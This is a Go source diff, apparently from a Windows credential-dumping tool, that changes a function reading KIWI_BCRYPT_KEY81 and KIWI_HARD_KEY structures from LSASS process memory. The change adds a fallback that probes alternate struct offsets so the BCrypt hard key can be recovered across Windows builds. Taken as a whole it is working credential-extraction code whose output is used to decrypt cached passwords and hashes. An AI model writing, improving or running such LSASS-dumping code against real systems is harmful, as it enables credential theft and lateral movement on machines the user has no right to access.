@@ -588,14 +588,21 @@ func readBcryptKey81(r lsassReader, addr uintptr) (bcryptKey81, error) {
 	if addr == 0 {
 		return bcryptKey81{}, fmt.Errorf("zero KIWI_BCRYPT_KEY81 address")
 	}
-	// Read the header + cbSecret in one shot. A second read collects the
-	// trailing key bytes so the buffer doesn't need a worst-case allocation.
-	hdr, err := r.Read(addr, bcryptHardKeyDataOff)
-	if err != nil {
-		return bcryptKey81{}, fmt.Errorf("read KIWI_BCRYPT_KEY81 header at 0x%X: %w", addr, err)
-	}
-	if len(hdr) < bcryptHardKeyDataOff {
-		return bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(hdr), bcryptHardKeyDataOff)
+	// Read enough bytes for the header plus potential hard key at various
+	// offsets. Server 2019 may use a different struct size than Win10/11.
+	// Try reading 0x60 bytes first; fall back to the minimum if the read
+	// returns fewer bytes (bufferReader in tests returns exact sizes).
+	const readSize = 0x60
+	hdr, err := r.Read(addr, readSize)
+	if err != nil || len(hdr) < int(bcryptHardKeyDataOff) {
+		// Retry with just the standard header size
+		hdr, err = r.Read(addr, bcryptHardKeyDataOff)
+		if err != nil {
+			return bcryptKey81{}, fmt.Errorf("read KIWI_BCRYPT_KEY81 header at 0x%X: %w", addr, err)
+		}
+		if len(hdr) < int(bcryptHardKeyDataOff) {
+			return bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(hdr), bcryptHardKeyDataOff)
+		}
 	}
 
 	k := bcryptKey81{
@@ -611,19 +618,68 @@ func readBcryptKey81(r lsassReader, addr uintptr) (bcryptKey81, error) {
 	if k.CbSecret == 0 {
 		return k, nil
 	}
-	if k.CbSecret > bcryptKeySanityMaxBytes {
-		return k, fmt.Errorf("KIWI_HARD_KEY.cbSecret=%d exceeds sanity cap %d (tag=0x%08X valid=%v bits=%d addr=0x%X — likely wrong key pointer or layout)", k.CbSecret, bcryptKeySanityMaxBytes, k.Tag, k.TagValid, k.Bits, addr)
+
+	// Try the standard layout first (KIWI_BCRYPT_KEY81: hard key at +0x40)
+	if k.CbSecret <= bcryptKeySanityMaxBytes {
+		keyBytes, err := r.Read(addr+uintptr(bcryptHardKeyDataOff), k.CbSecret)
+		if err != nil {
+			return k, fmt.Errorf("read KIWI_HARD_KEY.data at 0x%X (%d bytes): %w", addr+uintptr(bcryptHardKeyDataOff), k.CbSecret, err)
+		}
+		if uint32(len(keyBytes)) < k.CbSecret {
+			return k, fmt.Errorf("short read at 0x%X: got %d, want %d", addr+uintptr(bcryptHardKeyDataOff), len(keyBytes), k.CbSecret)
+		}
+		k.Key = make([]byte, k.CbSecret)
+		copy(k.Key, keyBytes)
+		return k, nil
 	}
-	keyBytes, err := r.Read(addr+uintptr(bcryptHardKeyDataOff), k.CbSecret)
-	if err != nil {
-		return k, fmt.Errorf("read KIWI_HARD_KEY.data at 0x%X (%d bytes): %w", addr+uintptr(bcryptHardKeyDataOff), k.CbSecret, err)
+
+	// Standard offset failed (cbSecret too large). Try alternative KIWI_HARD_KEY
+	// offsets used by different Windows builds. Scan the read buffer for a plausible
+	// cbSecret value (16, 24, or 32) that matches the expected key size for the
+	// algorithm's bit count.
+	expectedKeyLen := uint32(0)
+	switch k.Bits {
+	case 128:
+		expectedKeyLen = 16
+	case 168, 192:
+		expectedKeyLen = 24
+	case 256:
+		expectedKeyLen = 32
 	}
-	if uint32(len(keyBytes)) < k.CbSecret {
-		return k, fmt.Errorf("short read at 0x%X: got %d, want %d", addr+uintptr(bcryptHardKeyDataOff), len(keyBytes), k.CbSecret)
+
+	for _, tryOff := range []int{0x1C, 0x20, 0x28, 0x30, 0x38, 0x3C, 0x44, 0x48, 0x4C, 0x50} {
+		if tryOff+4 > len(hdr) {
+			continue
+		}
+		tryCb := binary.LittleEndian.Uint32(hdr[tryOff : tryOff+4])
+		if tryCb == 0 || tryCb > bcryptKeySanityMaxBytes {
+			continue
+		}
+		if expectedKeyLen > 0 && tryCb != expectedKeyLen {
+			continue
+		}
+		dataOff := tryOff + 4
+		if dataOff+int(tryCb) > len(hdr) {
+			// Need to read more bytes from LSASS
+			keyBytes, err := r.Read(addr+uintptr(dataOff), tryCb)
+			if err != nil {
+				continue
+			}
+			k.CbSecret = tryCb
+			k.Key = make([]byte, tryCb)
+			copy(k.Key, keyBytes)
+			return k, nil
+		}
+		k.CbSecret = tryCb
+		k.Key = make([]byte, tryCb)
+		copy(k.Key, hdr[dataOff:dataOff+int(tryCb)])
+		return k, nil
 	}
-	k.Key = make([]byte, k.CbSecret)
-	copy(k.Key, keyBytes)
-	return k, nil
+
+	return k, fmt.Errorf("KIWI_HARD_KEY.cbSecret=%d exceeds sanity cap %d and no alternative offset found (tag=0x%08X valid=%v bits=%d addr=0x%X hex=%s)",
+		binary.LittleEndian.Uint32(hdr[bcryptHardKeyCbSecretOff:bcryptHardKeyCbSecretOff+4]),
+		bcryptKeySanityMaxBytes, k.Tag, k.TagValid, k.Bits, addr,
+		hex.EncodeToString(hdr))
 }
 
 // readBcryptKeyMaterial is the convenience wrapper Phase 2C-ii-b uses on the
